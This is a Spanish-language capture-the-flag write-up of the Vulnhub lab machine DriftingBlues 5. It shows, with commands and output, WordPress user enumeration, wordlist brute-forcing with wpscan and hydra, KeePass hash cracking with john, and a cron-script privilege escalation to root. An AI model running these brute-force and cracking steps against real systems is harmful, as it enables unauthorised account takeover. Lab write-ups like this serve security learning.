---
title: DriftingBlues 5 Writeup - Vulnhub
date: 2025-01-25
categories: [Writeups, Vulnhub]
tags: [Linux, Vulnhub, CTF, Easy, HTTP, DriftingBlues, Wordpress, wpscan, cewl, Hydra, wpscan]
image:
  path: /assets/img/commons/vulnhub/vulnhub.jpg
---

Resolución máquina anterior: [**DriftingBlues4**](https://lvs3c.github.io/posts/DriftingBlues-4/)

¡Saludos!

En este writeup, nos adentraremos en la máquina [**DriftingBlues5**](https://www.vulnhub.com/entry/driftingblues-5,662/), la cual tiene un nivel de dificultad **fácil** según la plataforma. Se trata de una máquina **Linux** en la cual veremos **enumeración de servicios**, **cewl** para generar un diccionario y realizar fuerza bruta sobre **Wordpress** con **wpscan**, **Hydra** para fuerta bruta del servicio `SSH`{: .filepath} para luego conectarnos a la máquina víctima y utilizaremos **linPEAS** y **Pspy** para validar el sitema y procesos logrando así elevar nuestros privilegios como usuario **root**, obteniendo las flags del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ arp-scan -I ens32 --localnet --ignoredups
Interface: ens32, type: EN10MB, MAC: 00:0c:29:c4:47:79, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.35     00:0c:29:36:3e:86       VMware, Inc.
10.11.12.254    00:50:56:f6:71:b0       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.551 seconds (100.35 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.35
PING 10.11.12.35 (10.11.12.35) 56(84) bytes of data.
64 bytes from 10.11.12.35: icmp_seq=1 ttl=64 time=0.507 ms

--- 10.11.12.35 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.507/0.507/0.507/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.35 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 15:46 -03
Nmap scan report for 10.11.12.35
Host is up (0.0064s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:36:3E:86 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p22,80 -sCV 10.11.12.35 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 15:46 -03
Nmap scan report for 10.11.12.35
Host is up (0.00041s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: diary &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.38 (Debian)
|_http-generator: WordPress 5.6.2
MAC Address: 00:0C:29:36:3E:86 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.02 seconds
```

El informe de `Nmap` nos revela:
- Puerto `22` servidor `OpenSSH 7.9p1`
- Puerto `80` servidor `Apache 2.4.38` Donde puede correr un `CMS Wordpress`{: .filepath}.


### HTTP - 80

Hacemos un análisis de la web con `whatweb` para ver su tecnología.

```bash
❯ whatweb http://10.11.12.35/
http://10.11.12.35/ [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.11.12.35], MetaGenerator[WordPress 5.6.2], PoweredBy[--], Script, Title[diary &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.6.2]
```

Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯ nmap -p80 --script http-enum 10.11.12.35 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 15:54 -03
Nmap scan report for 10.11.12.35
Host is up (0.00041s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2
|   /: WordPress version: 5.6.2
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
MAC Address: 00:0C:29:36:3E:86 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds
```

Confirmamos `Wordpress` en su versión 5.6.2.

![wordpress](/assets/img/commons/vulnhub/DriftingBlues5/wordpress.png){: .center-image }

Lanzamos la herramienta `wpscan` para averiguar más sobre el sitio.

```bash
❯ wpscan --url http://10.11.12.35 -e u,vp,vt,dbe --api-token=$WPSCAN_KEY --random-user-agent
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.11.12.35/ [10.11.12.35]
[+] Started: Tue Jan 28 16:04:51 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.11.12.35/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.11.12.35/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.11.12.35/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.11.12.35/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.11.12.35/index.php/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://10.11.12.35/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |
 | [!] 44 vulnerabilities identified:

[i] User(s) Identified:

[+] abuzerkomurcu
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.11.12.35/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] gadd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] gill
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] collins
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] satanic
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Le herramienta nos dice que la versión de Wordepress está sin actualizar, bajo 44 vulnerabilidades y nos proveé 5 usuarios, los cuales usaremos para realizar fuerza bruta.

En esta ocasión, vamos a utilizar la herramienta `cewl`, la cual nos permite crear un diccionario con el contenido de la web, porque a veces las password de los usuarios se componen de estas palabras. También podemos usar el diccionario `rockyou`.

El mínimo de longitud de una clave en wordpress es de 6 caracteres, es decir, partimos de como mínimo 6 caracteres para crear el diccionario de palabras.

```bash
❯ cewl -m 6 -w dic_cewl.txt http://10.11.12.35

❯ wc dic_cewl.txt
 936  936 8334 dic_cewl.txt
```

Lanzamos wpscan para realizar fuerza bruta sobre los usuarios encontrados, utilizando nuestro diccionario y 20 hilos `(-t 20)`.

```bash
❯ wpscan --url http://10.11.12.35 -U users.txt -P dic_cewl.txt -t 20

[+] Performing password attack on Wp Login against 5 user/s
[SUCCESS] - gill / interchangeable
Trying abuzerkomurcu / Wristshot Time: 00:00:38 <========================      > (4512 / 5448) 82.81%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: gill, Password: interchangeable
```

Dicho password se encuentra en el diccionario *rockyou*, también hubiese funcionado.


## Explotación

---

Nos logueamos en el panel de administración con las credenciales obtenidas, pero dicho usuario no es administrador, con lo cual no podemos modificar los archivos de configuración para generarnos una reverse shell, procedemos a analizar Wordpress y encontramos las imagenes siguientes:

![upload_img](/assets/img/commons/vulnhub/DriftingBlues5/upload_img.png){: .center-image }

Nos llama la atención una con el nombre de la máquina que estamos realizando, la descargamos y procedemos a listar los metadatos con la herramienta `exiftool`.

```bash
❯ exiftool dblogo.png
ExifTool Version Number         : 12.57
File Name                       : dblogo.png
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2021:02:24 11:46:01-03:00
File Access Date/Time           : 2025:01:28 21:24:57-03:00
File Inode Change Date/Time     : 2025:01:28 21:24:57-03:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 300
Image Height                    : 300
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 2835
Pixels Per Unit Y               : 2835
Pixel Units                     : meters
XMP Toolkit                     : Adobe XMP Core 5.6-c142 79.160924, 2017/07/13-01:06:39
Creator Tool                    : Adobe Photoshop CC 2018 (Windows)
Create Date                     : 2021:02:24 02:55:28+03:00
Metadata Date                   : 2021:02:24 02:55:28+03:00
Modify Date                     : 2021:02:24 02:55:28+03:00
Instance ID                     : xmp.iid:562b80d4-fe12-8541-ae0c-6a21e7859405
Document ID                     : adobe:docid:photoshop:7232d876-a1d0-044b-9604-08837143888b
Original Document ID            : xmp.did:5890be6c-649b-0248-af9b-19889727200c
Color Mode                      : RGB
ICC Profile Name                : sRGB IEC61966-2.1
Format                          : image/png
History Action                  : created, saved
History Instance ID             : xmp.iid:5890be6c-649b-0248-af9b-19889727200c, xmp.iid:562b80d4-fe12-8541-ae0c-6a21e7859405
History When                    : 2021:02:24 02:55:28+03:00, 2021:02:24 02:55:28+03:00
History Software Agent          : Adobe Photoshop CC 2018 (Windows), Adobe Photoshop CC 2018 (Windows)
History Changed                 : /
Text Layer Name                 : ssh password is 59583hello of course it is lowercase maybe not
Text Layer Text                 : ssh password is 59583hello of course it is lowercase maybe not :)
Document Ancestors              : adobe:docid:photoshop:871a8adf-5521-894c-8a18-2b27c91a893b
Image Size                      : 300x3
```

Nos dice que la contraseña de ssh es `59583hello`, procedemos a usar hydra para fuerza bruta sobre todos los usuarios.

```bash
❯ hydra -L users.txt -p 59583hello 10.11.12.35 ssh -t 10
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-28 21:27:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking ssh://10.11.12.35:22/
[22][ssh] host: 10.11.12.35   login: gill   password: 59583hello
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-28 21:27:05
```

Dicha contraseña corresponde al usuario `gill`, nos conectamos por `ssh`.

```bash
❯ ssh gill@10.11.12.35
gill@10.11.12.35's password:
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gill@driftingblues:~$
```

## Escalación de privilegios

---

Listamos la Flag 1.

```bash
gill@driftingblues:~$ cat user.txt
flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█
```

Listando el contenido del usuario, observamos un archivo correspondiente a keepass.

```bash
gill@driftingblues:~$ ls -la
total 24
drwxr-xr-x 4 gill gill 4096 Jan 28 14:26 .
drwxr-xr-x 4 root root 4096 Feb 24  2021 ..
drwx------ 3 gill gill 4096 Jan 28 14:26 .gnupg
drwx------ 2 gill gill 4096 Feb 24  2021 .ssh
-rwx------ 1 gill gill 2030 Feb 24  2021 keyfile.kdbx
-r-x------ 1 gill gill 1805 Jan  3  2021 user.txt
```

Usamos `John` para obtener el hash y luego crackear la contraseña.

```bash
❯ keepass2john keyfile.kdbx > keepass.txt
❯ cat keepass.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: keepass.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ keyfile:$keepass$*2*60000*0*86fe1a63955b5984c0adb127a869153f24c41fdc56678d555f778d1309f9867c*e580d1bef4bf0f44b845fc
       │ e13c9648cd22f143760be5bae503a419a7f76a21f0*e99d45aab90c26200191dbca6b3fae34*e3169392c5eec5
```

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt keepass.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
porsiempre       (keyfile)
```

Procedemos a visualizar el contenido del archivo utilizando [keeweb](https://app.keeweb.info/), pero no obtenemos información relevante.

![keeweb](/assets/img/commons/vulnhub/DriftingBlues5/keeweb.png){: .center-image }

Vamos a profundizar en detalle sobre como podríamos escalar privilegios mediante el script [**LinPEAS**](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS).
También vamos a monitorizar procesos con [**Pspy**](https://github.com/DominicBreuker/pspy).

Con lo cual obtenemos los siguientes datos:

![linpeas](/assets/img/commons/vulnhub/DriftingBlues5/linpeas.png){: .center-image }

![pspy](/assets/img/commons/vulnhub/DriftingBlues5/pspy.png){: .center-image }


En esto punto podemos pensar que los datos obtenidos del archivo *keyfile.kdbx* deben tener algo que ver en esta tarea *CRON* y especialmente en el directorio `/keyfolder`{: .filepath}. 

Procedemos a crear archivos con dichos nombres y esperar 1 minuto para ver si la tarea CRON realiza alguna modificación o si agrega algo más.

```bash
gill@driftingblues:/keyfolder$ touch 2real4surreal buddyretard closet313 exalted fracturedocean zakkwylde
gill@driftingblues:/keyfolder$ ls
fracturedocean 2real4surreal buddyretard closet313 exalted zakkwylde rootcreds.txt
gill@driftingblues:/keyfolder$ cat rootcreds.txt
root creds

imjustdrifting31
gill@driftingblues:/keyfolder$ su - root
Password:
root@driftingblues:~# cd /root
root@driftingblues:~# ls
key.sh  root.txt
root@driftingblues:~# cat root.txt
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!

root@driftingblues:~# cat key.sh
#!/bin/bash

if [[ $(ls /keyfolder) == "fracturedocean" ]]; then
        echo "root creds" >> /keyfolder/rootcreds.txt
        echo "" >> /keyfolder/rootcreds.txt
        echo "imjustdrifting31" >> /keyfolder/rootcreds.txt
fi
```

Hope it helps!